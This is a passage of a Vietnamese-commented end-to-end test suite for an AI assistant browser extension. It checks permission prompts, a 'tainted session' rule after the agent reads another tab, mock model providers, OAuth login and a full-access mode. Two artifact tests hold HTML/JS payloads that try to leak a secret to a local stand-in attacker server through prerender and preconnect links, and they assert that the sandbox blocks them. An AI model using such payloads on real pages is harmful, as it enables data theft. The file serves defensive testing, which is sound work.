    it('chế độ tự nhận chỉnh sửa vẫn hỏi khi liệt kê tab hoặc đọc tab khác; sau khi đã đọc tab khác thì mọi thao tác trang đều hỏi lại', async () => {
      const second = await c.browser.newPage();
      await second.goto(`${c.other}/bi-mat`, { waitUntil: 'load' });
      const otherTabId = await c.panel.evaluate(async (u) => (await chrome.tabs.query({ url: `${u}/*` }))[0]?.id, c.other);
      await c.fixture.bringToFront();

      // (1) liệt kê tab luôn hỏi, kể cả ở chế độ tự nhận
      await newRun(c, 'acceptEdits');
      const list = await runScript(c, [{ calls: [{ name: 'tabs_list', input: {} }] }, { text: 'Xong.' }], 'Xem các tab', 'allow');
      expect(list.perms.map((p: any) => p.title)).toEqual([expect.stringContaining('danh sách các tab')]);

      // (2) bấm trước khi đọc tab khác: tự duyệt; đọc tab khác: hỏi; bấm sau khi đọc: hỏi lại (phiên đã "nhiễm")
      await newRun(c, 'acceptEdits');
      const r = await runScript(
        c,
        [skill, { calls: [{ name: 'page_snapshot', input: {} }] }, { calls: [{ name: 'page_click', input: { ref: '@ref:button|Thêm vào giỏ|1' } }] }, { calls: [{ name: 'page_read', input: { tab_id: otherTabId } }] }, { calls: [{ name: 'page_click', input: { ref: '@ref:button|Thêm vào giỏ|2' } }] }, { text: 'Xong.' }],
        'Thêm hai sản phẩm',
        'allow',
      );
      await second.close();
      const titles = r.perms.map((p: any) => p.title as string);
      expect(titles).toHaveLength(2);
      expect(titles[0]).toMatch(/đọc tab/);
      expect(titles[1]).toMatch(/Bấm nút/);
      expect(await c.fixture.$eval('#cart', (e) => e.textContent)).toBe('2');
    });

    it('menu chuột phải lúc khung chat MỚI MỞ (khởi động nguội): đoạn trích vẫn vào ô nhập; hành động của cửa sổ khác không bị khung này nhận', async () => {
      await newRun(c);
      // Ghi hành động từ MỘT TRANG KHÁC của extension (khung chat đang đóng/chưa nghe), rồi mở khung chat.
      await c.panel.goto('about:blank');
      const writer = await c.browser.newPage();
      await writer.goto(`chrome-extension://${c.extId}/artifact.html`, { waitUntil: 'load' });
      await writer.evaluate(() => chrome.storage.session.set({ 'nd.pending': { kind: 'ask', text: 'Đoạn được chọn từ trang', ts: Date.now() } }));
      const tabId = await writer.evaluate(async (u) => (await chrome.tabs.query({ url: `${u}/*` }))[0]?.id, c.base);
      await writer.close();
      await c.panel.goto(`chrome-extension://${c.extId}/sidepanel.html?anchor=${tabId}`, { waitUntil: 'load' });
      await c.panel.bringToFront(); // waitForFunction dùng rAF: tab nền (do test trước đưa trang mẫu lên trước) không bao giờ chạy lại vị từ
      await c.panel.waitForFunction(() => (window as any).__nd && (window as any).__ndTest && document.querySelector('.app'), { timeout: 30_000 });
      try {
        await c.panel.waitForFunction(() => ((document.querySelector('.composer-input') as HTMLTextAreaElement | null)?.value ?? '').includes('Đoạn được chọn từ trang'), { timeout: 15_000 });
      } catch (err) {
        const dbg = await c.panel.evaluate(async () => {
          const w = window as any;
          const v = w.__nd.controller.snapshot().view;
          return { composer: (document.querySelector('.composer-input') as HTMLTextAreaElement | null)?.value, ready: w.__nd.controller.stats.ready, uiReady: w.__nd.controller.uiReady, queued: w.__nd.controller.queuedInserts?.length, screen: v.screen, transcript: v.transcript.length, pending: (await chrome.storage.session.get('nd.pending'))['nd.pending'] ?? null, body: document.body.innerText.slice(0, 200) };
        });
        throw new Error(`Ô nhập không nhận đoạn trích: ${JSON.stringify(dbg)} (${err instanceof Error ? err.message : err})`);
      }

      // Hành động gắn cửa sổ khác: khung này phải để nguyên (không thực hiện, không xoá).
      await c.panel.evaluate(() => chrome.storage.session.set({ 'nd.pending': { kind: 'summarize', windowId: -12345, ts: Date.now() } }));
      await new Promise((r) => setTimeout(r, 1200));
      const left = (await c.panel.evaluate(async () => ({ pending: (await chrome.storage.session.get('nd.pending'))['nd.pending'] as { windowId?: number } | undefined, users: (window as any).__nd.controller.snapshot().view.transcript.filter((i: any) => i.kind === 'user').length }))) as { pending?: { windowId?: number }; users: number };
      expect(left.pending?.windowId).toBe(-12345);
      expect(left.users).toBe(0);
      await c.panel.evaluate(() => chrome.storage.session.remove('nd.pending'));
    });

    // Trong đường ống xem trước thật, CSP + sandbox chặn gần hết kênh ra ngoài, nhưng KHÔNG chặn `<link rel="prerender">` (HTTP GET tới URL trong href) và `rel="preconnect"`
    // (đo trên Chrome/Edge 156). Hai lớp chặn: bộ lọc nguồn ở vỏ (thẻ có sẵn) và đoạn mở đầu trong tài liệu (mã tạo <link> lúc chạy).
    const startAttacker = async () => {
      const hits: string[] = [];
      const conns = { n: 0 };
      const server = http.createServer((req, res) => {
        hits.push(req.url ?? '');
        res.end('x');
      });
      server.on('connection', () => conns.n++);
      await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
      const port = (server.address() as { port: number }).port;
      const stop = async () => {
        server.closeAllConnections();
        await new Promise<void>((r) => server.close(() => r()));
      };
      return { hits, conns, port, stop };
    };

    const frameTexts = (viewer: Page, text: string) => async (): Promise<boolean> => {
      for (let i = 0; i < 24; i++) {
        for (const f of viewer.frames()) {
          // Mỗi lần đọc một khung có hạn 1 giây: khung đang điều hướng có thể không bao giờ trả lời evaluate.
          const body = await Promise.race([f.evaluate(() => document.body?.innerText ?? '').catch(() => ''), new Promise<string>((r) => setTimeout(() => r(''), 1000))]);
          if (body.includes(text)) return true;
        }
        await new Promise((r) => setTimeout(r, 250));
      }
      return false;
    };

    it('artifact: <link rel=prerender|preconnect|…> có sẵn trong nguồn bị lọc ở vỏ, và mã tạo <link> lúc chạy (createElement, innerHTML, insertAdjacentHTML, document.write) bị vô hiệu — máy chủ ngoài không nhận gì', async () => {
      const atk = await startAttacker();
      const U = (tag: string) => `http://127.0.0.1:${atk.port}/${tag}?d=BI-MAT`;
      const id = `art_e2e_${Date.now()}`;
      const content =
        `<!doctype html><html><head><title>t</title>` +
        `<link rel="prerender" href="${U('static-prerender')}"><link rel="preconnect" href="http://127.0.0.1:${atk.port}"><link rel="dns-prefetch" href="//127.0.0.1:${atk.port}">` +
        `</head><body><p id="ok">Xin chào artifact</p>` +
        `<script>document.getElementById('ok').textContent += ' (script chạy)';` +
        `var l=document.createElement('link');l.rel='prerender';l.href='${U('js-create')}';document.head.appendChild(l);` +
        `document.head.innerHTML+='<link rel="prerender" href="${U('js-inner')}">';` +
        `document.body.insertAdjacentHTML('beforeend','<link rel="prerender" href="${U('js-adjacent')}">');` +
        `document.write('<link rel="prerender" href="${U('js-write')}">');` +
        `</script></body></html>`;
      await c.panel.evaluate((i, html) => chrome.storage.session.set({ [`nd.artifact.${i}`]: { id: i, title: 'Thử', type: 'html', content: html, version: 1 } }), id, content);
      const viewer = await c.browser.newPage();
      await viewer.goto(`chrome-extension://${c.extId}/artifact.html?id=${id}`, { waitUntil: 'load' });
      const shown = await frameTexts(viewer, 'Xin chào artifact (script chạy)')();
      await new Promise((r) => setTimeout(r, 2500)); // thời gian cho trình duyệt phát yêu cầu tải trước (nếu còn)
      await viewer.close();
      await atk.stop();
      expect(shown, 'artifact hiển thị và script nội tuyến vẫn chạy').toBe(true);
      expect(atk.hits, 'không có yêu cầu HTTP nào ra ngoài').toEqual([]);
      expect(atk.conns.n, 'không mở kết nối (preconnect) nào ra ngoài').toBe(0);
    });

    it('artifact (mã chạy lúc chạy, không qua bộ lọc nguồn): đoạn mở đầu trong tài liệu chặn các đường tạo <link> bằng mã', async () => {
      const atk = await startAttacker();
      const U = (tag: string) => `http://127.0.0.1:${atk.port}/${tag}?d=BI-MAT`;
      const id = `art_pre_${Date.now()}`;
      await c.panel.evaluate((i) => chrome.storage.session.set({ [`nd.artifact.${i}`]: { id: i, title: 'Vỏ', type: 'html', content: '<p>VIEWER-XONG</p>', version: 1 } }), id);
      const viewer = await c.browser.newPage();
      await viewer.goto(`chrome-extension://${c.extId}/artifact.html?id=${id}`, { waitUntil: 'load' });
      expect(await frameTexts(viewer, 'VIEWER-XONG')(), 'vỏ đã vẽ xong').toBe(true);
      // Gửi thẳng vào khung sandbox tài liệu KHÔNG qua bộ lọc nguồn (chỉ có đoạn mở đầu của renderArtifactDocumentWithFonts).
      const body =
        `<p>PRELUDE-DA-VE</p><script>` +
        `var l=document.createElement('link');l.rel='prerender';l.href='${U('create')}';document.head.appendChild(l);` +
        `var p=document.createElement('link');p.rel='preconnect';p.href='http://127.0.0.1:${atk.port}';document.head.appendChild(p);` +
        `document.head.innerHTML+='<link rel="prerender" href="${U('inner')}">';` +
        `document.body.insertAdjacentHTML('beforeend','<LINK rel="prerender" href="${U('adjacent')}">');` +
        `document.write('<lin<link>k rel="prerender" href="${U('write-nested')}">');` +
        `new DOMParser().parseFromString('<link rel="prerender" href="${U('domparser')}">','text/html');` +
        `document.createRange().createContextualFragment('<link rel="prerender" href="${U('fragment')}">');` +
        `</script>`;
      const raw = renderArtifactDocumentWithFonts({ type: 'html', title: 'ctl', content: `<html><head></head><body>${body}</body></html>` }, '');
      const reloaded = await viewer.evaluate(
        (html) =>
          new Promise<boolean>((resolve) => {
            const f = document.getElementById('frame') as HTMLIFrameElement;
            const timer = setTimeout(() => resolve(false), 8000);
            f.addEventListener(
              'load',
              () => {
                clearTimeout(timer);
                f.contentWindow!.postMessage({ type: 'nd-render', html }, '*');
                resolve(true);
              },
              { once: true },
            );
            f.src = 'artifact-sandbox.html'; // như vỏ làm mỗi lần vẽ: nạp lại khung → bộ lắng nghe mới
          }),
        raw,
      );
      expect(reloaded, 'khung sandbox nạp lại được').toBe(true);
      const shown = await frameTexts(viewer, 'PRELUDE-DA-VE')();
      await new Promise((r) => setTimeout(r, 2500));
      await viewer.close();
      await atk.stop();
      expect(shown, 'tài liệu thô đã được vẽ (phép đo hợp lệ)').toBe(true);
      expect(atk.hits).toEqual([]);
      expect(atk.conns.n).toBe(0);
    });


    // ───────────────────── Nhà cung cấp THẬT qua fetch của trình duyệt (máy chủ giả cục bộ) ─────────────────────
    // Hồi quy cho lỗi người dùng gặp với DeepSeek: "Illegal invocation" khiến MỌI nhà cung cấp báo "Không kết nối được tới máy chủ".
    // Các test dùng kịch bản (ScriptedProvider) bỏ qua tầng HTTP nên không bao giờ thấy lỗi này; test dưới đây đi qua http.ts + fetch thật.

    const okChatStream: SseEvent[] = [
      { data: { choices: [{ index: 0, delta: { content: 'Xin chào từ máy chủ giả. ' } }] } },
      { data: { choices: [{ index: 0, delta: { content: 'Tiếng Việt có dấu vẫn đúng.' } }] } },
      { data: { choices: [{ index: 0, delta: {}, finish_reason: 'stop' }], usage: { prompt_tokens: 11, completion_tokens: 7 } } },
      { data: '[DONE]' },
    ];

    it('OpenAI-tương thích (kiểu DeepSeek/Grok…) qua fetch THẬT: kiểm tra kết nối → danh sách model → trả lời streaming tiếng Việt', async () => {
      const mock = await MockServer.start();
      mock.replyAlways((req) => (req.path.endsWith('/models') ? { json: { data: [{ id: 'mock-chat' }] } } : { sse: okChatStream }));
      try {
        await newRun(c);
        const out = await c.panel.evaluate(async (url) => {
          const w = window as any;
          const ctl = w.__nd.controller;
          const results: any[] = [];
          const on = (e: MessageEvent) => {
            if (e.data?.type === 'test_result') results.push(e.data);
          };
          window.addEventListener('message', on);
          await ctl.onMessage({ type: 'save_custom_provider', provider: { label: 'Máy chủ giả e2e', kind: 'openai-chat', baseUrl: `${url}/v1`, models: 'mock-chat', requiresKey: true, apiKey: 'sk-mock-1234567890abcdef' } });
          const prov = ctl.snapshot().view.providers.find((p: any) => p.label === 'Máy chủ giả e2e');
          await ctl.onMessage({ type: 'test_connection', provider: prov.id });
          for (let i = 0; i < 100 && results.length === 0; i++) await new Promise((r) => setTimeout(r, 50));
          await ctl.setModel(prov.id, 'mock-chat');
          await ctl.send('Xin chào', []);
          window.removeEventListener('message', on);
          const id = prov.id as string;
          await ctl.onMessage({ type: 'remove_custom_provider', provider: id });
          return { results, transcript: ctl.snapshot().view.transcript };
        }, mock.url);
        expect(out.results[0]?.ok, JSON.stringify(out.results)).toBe(true);
        expect(mock.requests.some((r) => r.method === 'GET' && r.path === '/v1/models' && r.headers.authorization === 'Bearer sk-mock-1234567890abcdef')).toBe(true);
        const chat = mock.requests.find((r) => r.path === '/v1/chat/completions');
        expect(chat, 'có yêu cầu chat/completions').toBeTruthy();
        expect(chat!.json.stream).toBe(true);
        expect(chat!.json.model).toBe('mock-chat');
        expect(finalText(out.transcript)).toBe('Xin chào từ máy chủ giả. Tiếng Việt có dấu vẫn đúng.');
        expect(out.transcript.filter((i: any) => i.kind === 'notice' && i.level === 'error')).toEqual([]);
      } finally {
        await mock.close();
      }
    });

    it('Claude qua SDK chính thức trong trình duyệt: gửi cờ truy cập trực tiếp từ trình duyệt, nhận luồng SSE và danh sách model', async () => {
      const mock = await MockServer.start();
      const ev = (type: string, data: Record<string, unknown>): SseEvent => ({ event: type, data: { type, ...data } });
      mock.replyAlways((req) =>
        req.path.endsWith('/v1/models')
          ? { json: { data: [{ id: 'claude-mock', type: 'model', display_name: 'Claude giả', created_at: '2026-01-01T00:00:00Z' }], has_more: false, first_id: 'claude-mock', last_id: 'claude-mock' } }
          : {
              sse: [
                ev('message_start', { message: { id: 'msg_1', type: 'message', role: 'assistant', model: 'claude-mock', content: [], stop_reason: null, usage: { input_tokens: 20, output_tokens: 1 } } }),
                ev('content_block_start', { index: 0, content_block: { type: 'text', text: '' } }),
                ev('content_block_delta', { index: 0, delta: { type: 'text_delta', text: 'Chào từ Claude giả.' } }),
                ev('content_block_stop', { index: 0 }),
                ev('message_delta', { delta: { stop_reason: 'end_turn', stop_sequence: null }, usage: { output_tokens: 5 } }),
                ev('message_stop', {}),
              ],
            },
      );
      try {
        await newRun(c);
        const out = await c.panel.evaluate(async (url) => {
          const ctl = (window as any).__nd.controller;
          const results: any[] = [];
          const on = (e: MessageEvent) => {
            if (e.data?.type === 'test_result') results.push(e.data);
          };
          window.addEventListener('message', on);
          await ctl.onMessage({ type: 'set_base_url', provider: 'anthropic', baseUrl: url });
          await ctl.onMessage({ type: 'save_api_key', provider: 'anthropic', key: 'sk-ant-mock-1234567890abcdef' });
          await ctl.onMessage({ type: 'test_connection', provider: 'anthropic' });
          for (let i = 0; i < 100 && results.length === 0; i++) await new Promise((r) => setTimeout(r, 50));
          await ctl.setModel('anthropic', 'claude-mock');
          await ctl.send('Xin chào Claude', []);
          window.removeEventListener('message', on);
          const transcript = ctl.snapshot().view.transcript;
          // dọn: trả cấu hình về như cũ để không ảnh hưởng các test sau
          await ctl.onMessage({ type: 'set_base_url', provider: 'anthropic', baseUrl: '' });
          await ctl.onMessage({ type: 'clear_api_key', provider: 'anthropic' });
          return { results, transcript };
        }, mock.url);
        expect(out.results[0]?.ok, JSON.stringify(out.results)).toBe(true);
        const msg = mock.requests.find((r) => r.path === '/v1/messages');
        expect(msg, 'có yêu cầu /v1/messages').toBeTruthy();
        expect(msg!.headers['anthropic-dangerous-direct-browser-access']).toBe('true');
        expect(msg!.headers['x-api-key']).toBe('sk-ant-mock-1234567890abcdef');
        expect(msg!.json.stream).toBe(true);
        expect(finalText(out.transcript)).toBe('Chào từ Claude giả.');
      } finally {
        await mock.close();
      }
    });

    it('khoá sai: lỗi xác thực của máy chủ được báo đúng ý ("khoá API không hợp lệ"), không phải "không kết nối được"', async () => {
      const mock = await MockServer.start();
      mock.replyAlways({ status: 401, json: { error: { message: 'Incorrect API key provided', type: 'invalid_request_error' } } });
      try {
        const out = await c.panel.evaluate(async (url) => {
          const ctl = (window as any).__nd.controller;
          const results: any[] = [];
          const on = (e: MessageEvent) => {
            if (e.data?.type === 'test_result') results.push(e.data);
          };
          window.addEventListener('message', on);
          await ctl.onMessage({ type: 'save_custom_provider', provider: { label: 'Máy chủ 401 e2e', kind: 'openai-chat', baseUrl: `${url}/v1`, models: 'm', requiresKey: true, apiKey: 'sk-sai-1234567890' } });
          const prov = ctl.snapshot().view.providers.find((p: any) => p.label === 'Máy chủ 401 e2e');
          await ctl.onMessage({ type: 'test_connection', provider: prov.id });
          for (let i = 0; i < 100 && results.length === 0; i++) await new Promise((r) => setTimeout(r, 50));
          window.removeEventListener('message', on);
          await ctl.onMessage({ type: 'remove_custom_provider', provider: prov.id });
          return results;
        }, mock.url);
        expect(out[0]?.ok).toBe(false);
        expect(out[0]?.message).toMatch(/khoá API không hợp lệ|thu hồi/i);
        expect(out[0]?.message).not.toMatch(/không kết nối được/i);
      } finally {
        await mock.close();
      }
    });

    // ───────────────────── Đăng nhập bằng tài khoản (OAuth 2.0 + PKCE) qua chrome.identity THẬT ─────────────────────
    it('OAuth 2.0 + PKCE: đăng nhập qua chrome.identity thật → token Bearer đi tới API; hết hạn thì tự làm mới bằng refresh token; đăng xuất thì ngừng gửi', async () => {
      const mock = await MockServer.start();
      let challenge = '';
      let accessIssued = 0;
      const seenAuth: string[] = [];
      const grants: string[] = [];
      const bearer = (h: string | undefined) => (h ?? '').replace(/^Bearer /, '');
      mock.replyAlways((req) => {
        const u = new URL(req.url, mock.url);
        if (req.path === '/authorize') {
          challenge = u.searchParams.get('code_challenge') ?? '';
          expect(u.searchParams.get('code_challenge_method')).toBe('S256');
          expect(u.searchParams.get('response_type')).toBe('code');
          expect(u.searchParams.get('client_id')).toBe('nd-e2e');
          const back = new URL(u.searchParams.get('redirect_uri') ?? '');
          back.searchParams.set('code', 'MA-DANG-NHAP-1');
          back.searchParams.set('state', u.searchParams.get('state') ?? '');
          return { status: 302, headers: { location: back.toString() }, text: '' };
        }
        if (req.path === '/token') {
          const p = new URLSearchParams(req.body);
          grants.push(`${p.get('grant_type')}:${p.get('refresh_token') ?? p.get('code')}`);
          if (p.get('grant_type') === 'authorization_code') {
            // máy chủ kiểm PKCE: SHA-256(code_verifier) phải bằng code_challenge đã nhận ở bước authorize
            const ok = createHash('sha256').update(p.get('code_verifier') ?? '').digest('base64url') === challenge && p.get('code') === 'MA-DANG-NHAP-1';
            return ok ? { json: { access_token: `AT-${++accessIssued}`, refresh_token: 'RT-1', expires_in: 3600, token_type: 'Bearer' } } : { status: 400, json: { error: 'invalid_grant' } };
          }
          if (p.get('grant_type') === 'refresh_token' && p.get('refresh_token') === 'RT-1') return { json: { access_token: `AT-${++accessIssued}`, refresh_token: 'RT-2', expires_in: 3600, token_type: 'Bearer' } };
          return { status: 400, json: { error: 'invalid_grant' } };
        }
        seenAuth.push(`${req.method} ${req.path} ${bearer(req.headers.authorization)}`);
        if (!/^AT-\d+$/.test(bearer(req.headers.authorization))) return { status: 401, json: { error: { message: 'no token' } } };
        if (req.path.endsWith('/models')) return { json: { data: [{ id: 'cong-model' }] } };
        return { sse: okChatStream };
      });
      const label = 'Cổng OAuth e2e';
      try {
        await newRun(c);
        const spec = { flow: 'oauth2', authorizeUrl: `${mock.url}/authorize`, tokenUrl: `${mock.url}/token`, clientId: 'nd-e2e', scopes: 'models.read' };
        const id = await c.panel.evaluate(
          async (url, oauth, lbl) => {
            const ctl = (window as any).__nd.controller;
            await ctl.onMessage({ type: 'save_custom_provider', provider: { label: lbl, kind: 'openai-chat', baseUrl: `${url}/v1`, models: 'cong-model', requiresKey: true, oauth, loginNow: true } });
            const prov = ctl.snapshot().view.providers.find((p: any) => p.label === lbl);
            for (let i = 0; i < 200 && !prov?.oauth?.signedIn; i++) {
              await new Promise((r) => setTimeout(r, 50));
              if (ctl.snapshot().view.providers.find((p: any) => p.label === lbl)?.oauth?.signedIn) break;
            }
            return prov.id as string;
          },
          mock.url,
          spec,
          label,
        );
        const signedIn = await c.panel.evaluate((i) => (window as any).__nd.controller.snapshot().view.providers.find((p: any) => p.id === i)?.oauth, id);
        expect(signedIn, 'đã đăng nhập').toEqual({ flow: 'oauth2', signedIn: true });
        expect(grants[0]).toBe('authorization_code:MA-DANG-NHAP-1');

        // dùng token: kiểm tra kết nối + một lượt chat đều mang Bearer AT-1
        const out = await c.panel.evaluate(async (i) => {
          const ctl = (window as any).__nd.controller;
          const results: any[] = [];
          const on = (e: MessageEvent) => e.data?.type === 'test_result' && results.push(e.data);
          window.addEventListener('message', on);
          await ctl.onMessage({ type: 'test_connection', provider: i });
          for (let k = 0; k < 100 && results.length === 0; k++) await new Promise((r) => setTimeout(r, 50));
          await ctl.setModel(i, 'cong-model');
          await ctl.send('Xin chào cổng', []);
          window.removeEventListener('message', on);
          return { results, transcript: ctl.snapshot().view.transcript };
        }, id);
        expect(out.results[0]?.ok, JSON.stringify(out.results)).toBe(true);
        expect(finalText(out.transcript)).toBe('Xin chào từ máy chủ giả. Tiếng Việt có dấu vẫn đúng.');
        expect(seenAuth.every((l) => l.endsWith(' AT-1'))).toBe(true);
        expect(seenAuth.some((l) => l.includes('/v1/chat/completions'))).toBe(true);

        // hết hạn: ghi lại thời điểm hết hạn vào kho rồi MỞ LẠI khung chat (OAuthManager mới đọc kho) → lời gọi kế tiếp phải làm mới
        await c.panel.evaluate(async () => {
          const all = (await chrome.storage.local.get('nd.oauth'))['nd.oauth'] as Record<string, any>;
          for (const v of Object.values(all)) if (v.tokens) v.tokens.expiresAt = Date.now() - 5000;
          await chrome.storage.local.set({ 'nd.oauth': all });
        });
        await c.panel.reload({ waitUntil: 'load' });
        await c.panel.waitForFunction(() => (window as any).__nd && (window as any).__ndTest && document.querySelector('.app'), { timeout: 30_000 });
        const refreshed = await c.panel.evaluate(async (i) => {
          const ctl = (window as any).__nd.controller;
          const results: any[] = [];
          const on = (e: MessageEvent) => e.data?.type === 'test_result' && results.push(e.data);
          window.addEventListener('message', on);
          await ctl.onMessage({ type: 'test_connection', provider: i });
          for (let k = 0; k < 100 && results.length === 0; k++) await new Promise((r) => setTimeout(r, 50));
          window.removeEventListener('message', on);
          return results;
        }, id);
        expect(refreshed[0]?.ok, JSON.stringify(refreshed)).toBe(true);
        expect(grants.at(-1)).toBe('refresh_token:RT-1');
        expect(seenAuth.at(-1)).toMatch(/\/models AT-2$/); // dùng access token MỚI

        // đăng xuất: không còn gửi token
        await c.panel.evaluate((i) => (window as any).__nd.controller.onMessage({ type: 'oauth_logout', provider: i }), id);
        const after = await c.panel.evaluate((i) => (window as any).__nd.controller.snapshot().view.providers.find((p: any) => p.id === i), id);
        expect(after.oauth.signedIn).toBe(false);
        expect(after.hasKey).toBe(false);
        // dọn
        await c.panel.evaluate((i) => (window as any).__nd.controller.onMessage({ type: 'remove_custom_provider', provider: i }), id);
      } finally {
        await mock.close();
      }
    });

    it('OAuth: người dùng bị từ chối ở trang đăng nhập (access_denied) → báo rõ, không có token nào được lưu', async () => {
      const mock = await MockServer.start();
      mock.replyAlways((req) => {
        if (req.path === '/authorize') {
          const u = new URL(req.url, mock.url);
          const back = new URL(u.searchParams.get('redirect_uri') ?? '');
          back.searchParams.set('error', 'access_denied');
          back.searchParams.set('state', u.searchParams.get('state') ?? '');
          return { status: 302, headers: { location: back.toString() }, text: '' };
        }
        return { status: 500, json: { error: 'không được gọi' } };
      });
      try {
        await newRun(c);
        const out = await c.panel.evaluate(async (url) => {
          const ctl = (window as any).__nd.controller;
          const toasts: string[] = [];
          const on = (e: MessageEvent) => e.data?.type === 'toast' && toasts.push(e.data.text);
          window.addEventListener('message', on);
          await ctl.onMessage({ type: 'save_custom_provider', provider: { label: 'Cổng từ chối e2e', baseUrl: `${url}/v1`, oauth: { flow: 'oauth2', authorizeUrl: `${url}/authorize`, tokenUrl: `${url}/token`, clientId: 'nd-e2e' }, loginNow: true } });
          for (let k = 0; k < 100 && !toasts.some((t) => t.includes('từ chối')); k++) await new Promise((r) => setTimeout(r, 50));
          window.removeEventListener('message', on);
          const prov = ctl.snapshot().view.providers.find((p: any) => p.label === 'Cổng từ chối e2e');
          const stored = (await chrome.storage.local.get('nd.oauth'))['nd.oauth'] ?? {};
          const result = { toasts, signedIn: prov.oauth.signedIn, hasToken: Object.values(stored).some((v: any) => v.tokens) };
          await ctl.onMessage({ type: 'remove_custom_provider', provider: prov.id });
          return result;
        }, mock.url);
        expect(out.toasts.some((t) => t.includes('từ chối'))).toBe(true);
        expect(out.signedIn).toBe(false);
        expect(out.hasToken).toBe(false);
        expect(mock.requests.some((r) => r.path === '/token')).toBe(false); // không đổi mã khi bị từ chối
      } finally {
        await mock.close();
      }
    });


    // ───────────────────── Ảnh chụp màn hình bấm xem được + chế độ Toàn quyền ─────────────────────
    it('chụp màn hình: ảnh hiện thành hình thu nhỏ dưới dòng công cụ; bấm → xem phóng to (nền/Esc/nút đóng để thoát, có nút tải về); ảnh không được lưu vào kho', async () => {
      await newRun(c);
      await c.fixture.bringToFront(); // người dùng đang xem chính trang này → chụp thẳng, không chuyển tab
      await runScript(c, [{ calls: [{ name: 'page_screenshot', input: {} }] }, { text: 'Đã chụp.' }], 'Chụp màn hình trang này');
      await c.panel.bringToFront();
      await c.panel.waitForSelector('.tool-shot img', { timeout: 15_000 });
      await c.panel.waitForFunction(() => (document.querySelector('.tool-shot img') as HTMLImageElement | null)?.complete && (document.querySelector('.tool-shot img') as HTMLImageElement).naturalWidth > 0, { timeout: 10_000 });
      if (SHOTS) fs.mkdirSync(SHOTS, { recursive: true });
      const thumb = await c.panel.$eval('.tool-shot img', (img) => ({ src: (img as HTMLImageElement).src.slice(0, 30), w: (img as HTMLImageElement).naturalWidth, h: (img as HTMLImageElement).naturalHeight, label: (img as HTMLImageElement).closest('button')?.getAttribute('aria-label') }));
      expect(thumb.src.startsWith('data:image/jpeg;base64,')).toBe(true);
      expect(thumb.w).toBeGreaterThan(200);
      expect(thumb.h).toBeGreaterThan(100);
      expect(thumb.label).toMatch(/xem ảnh chụp/i);

      // bấm hình → lớp phủ phóng to
      await c.panel.click('.tool-shot');
      await c.panel.waitForSelector('.lightbox .lightbox-img', { timeout: 5000 });
      const big = await c.panel.$eval('.lightbox-img', (img) => ({ w: (img as HTMLImageElement).naturalWidth, shown: (img as HTMLImageElement).getBoundingClientRect().width > 100 }));
      expect(big.w).toBeGreaterThan(200);
      expect(big.shown).toBe(true);
      expect(await c.panel.$eval('.lightbox a[download]', (a) => (a as HTMLAnchorElement).href.startsWith('data:image/jpeg;base64,'))).toBe(true);
      if (SHOTS) await c.panel.screenshot({ path: path.join(SHOTS, `${name}-screenshot-lightbox.png`) });

      // Esc đóng; mở lại rồi bấm nút đóng; mở lại rồi bấm nền
      await c.panel.keyboard.press('Escape');
      await c.panel.waitForFunction(() => !document.querySelector('.lightbox'), { timeout: 3000 });
      await c.panel.click('.tool-shot');
      await c.panel.waitForSelector('.lightbox', { timeout: 3000 });
      await c.panel.click('.lightbox button[aria-label]');
      await c.panel.waitForFunction(() => !document.querySelector('.lightbox'), { timeout: 3000 });
      await c.panel.click('.tool-shot');
      await c.panel.waitForSelector('.lightbox', { timeout: 3000 });
      await c.panel.mouse.click(8, 8); // nền
      await c.panel.waitForFunction(() => !document.querySelector('.lightbox'), { timeout: 3000 });

      // quyền riêng tư: bản lưu xuống kho không chứa ảnh
      const stored = await c.panel.evaluate(async () => {
        const w = window as any;
        await w.__nd.controller.saveNow();
        const id = w.__nd.controller.snapshot().session.id;
        const loaded = await w.__nd.store.load(id);
        const blocks = loaded.transcript.filter((i: any) => i.kind === 'assistant').flatMap((i: any) => i.blocks).filter((b: any) => b.type === 'tool');
        return { tools: blocks.length, withImages: blocks.filter((b: any) => b.images).length };
      });
      expect(stored.tools).toBeGreaterThan(0);
      expect(stored.withImages).toBe(0);
    });

    it('Toàn quyền: chọn ở bộ chọn chế độ → hộp xác nhận nêu rủi ro → bật; thanh cảnh báo hiện; trợ lý đi qua mọi bước KHÔNG hỏi nhưng vẫn không nhập mật khẩu; tắt bằng thanh cảnh báo', async () => {
      await newRun(c);
      await c.panel.bringToFront();
      // mở bộ chọn chế độ (nút khiên) và chọn "Toàn quyền"
      await c.panel.click('.picker-btn[title^="Chế độ"], .picker-btn[title^="Permission"], .picker-btn[title*="quyền"]');
      await c.panel.waitForSelector('.popover-small .opt-row.is-danger', { timeout: 5000 });
      expect(await c.panel.$eval('.popover-small .opt-row.is-danger .opt-name', (e) => e.textContent)).toBe('Toàn quyền');
      await c.panel.click('.popover-small .opt-row.is-danger');
      await c.panel.waitForSelector('.dialog[role="alertdialog"]', { timeout: 5000 });
      const dialog = await c.panel.$eval('.dialog', (d) => d.textContent ?? '');
      expect(dialog).toContain('Bật Toàn quyền?');
      expect(dialog).toContain('không hỏi lại');
      expect(dialog).toContain('mật khẩu');
      if (SHOTS) {
        fs.mkdirSync(SHOTS, { recursive: true });
        await c.panel.screenshot({ path: path.join(SHOTS, `${name}-fullaccess-dialog.png`) });
      }
      // Huỷ thì chưa bật gì
      await c.panel.click('.dialog-actions .btn-ghost');
      await c.panel.waitForFunction(() => !document.querySelector('.dialog'), { timeout: 3000 });
      expect(await c.panel.evaluate(() => (window as any).__nd.controller.snapshot().session.mode)).toBe('default');
      // Mở lại và xác nhận
      await c.panel.click('.picker-btn[title^="Chế độ"], .picker-btn[title^="Permission"], .picker-btn[title*="quyền"]');
      await c.panel.waitForSelector('.popover-small .opt-row.is-danger', { timeout: 5000 });
      await c.panel.click('.popover-small .opt-row.is-danger');
      await c.panel.waitForSelector('.dialog .btn-danger', { timeout: 5000 });
      await c.panel.click('.dialog .btn-danger');
      await c.panel.waitForSelector('.fullaccess-bar', { timeout: 5000 });
      expect(await c.panel.evaluate(() => (window as any).__nd.controller.snapshot().session.mode)).toBe('bypass');
      if (SHOTS) await c.panel.screenshot({ path: path.join(SHOTS, `${name}-fullaccess-on.png`) });

      // Làm việc ở chế độ Toàn quyền: sang origin khác, đọc tab khác, bấm — không hỏi lần nào; nhập mật khẩu vẫn bị từ chối
      const second = await c.browser.newPage();
      await second.goto(`${c.other}/bi-mat`, { waitUntil: 'load' });
      const otherTabId = await c.panel.evaluate(async (u) => (await chrome.tabs.query({ url: `${u}/*` }))[0]?.id, c.other);
      await c.fixture.bringToFront();
